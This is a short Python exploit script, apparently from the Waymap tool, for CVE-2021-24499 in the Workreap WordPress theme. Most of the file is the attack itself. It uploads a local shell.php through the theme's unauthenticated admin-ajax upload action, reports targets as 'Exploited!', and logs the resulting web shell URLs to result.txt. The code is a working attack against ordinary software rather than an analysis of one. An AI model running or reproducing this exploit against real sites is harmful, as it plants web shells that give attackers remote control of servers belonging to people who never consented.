# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24499

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    BOLD = '\033[1m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    RESET = '\033[0m'

def check_vulnerability(target):
    shell_path = 'shell.php'
    
    with open(shell_path, 'rb') as shell_file:
        files = {
            'action': 'workreap_award_temp_file_uploader',
            'award_img': shell_file
        }
        try:
            response = requests.post(f"{target}/wp-admin/admin-ajax.php", files=files, verify=False)
            if "File uploaded!" in response.text:
                return True
            else:
                return False
        except requests.RequestException as e:
            print(f"{Colors.RED}Error connecting to {target}: {e}{Colors.RESET}")
            return False

def scan_cve_2021_24499(target):
    print(f"{Colors.BOLD}Checking {target}...{Colors.RESET}")
    if check_vulnerability(target):
        shell_url = f"{target}/wp-content/uploads/workreap-temp/shell.php"
        print(f"{Colors.GREEN}[*] {Colors.BOLD}{target} Exploited!{Colors.RESET} \n --> SHELL: {Colors.BOLD}{shell_url}{Colors.RESET}")
        with open('result.txt', 'a') as result_file:
            result_file.write(f"{shell_url}\n")
    else:
        print(f"{Colors.RED}[-] {Colors.BOLD}{target} Not Vulnerable!{Colors.RESET}")

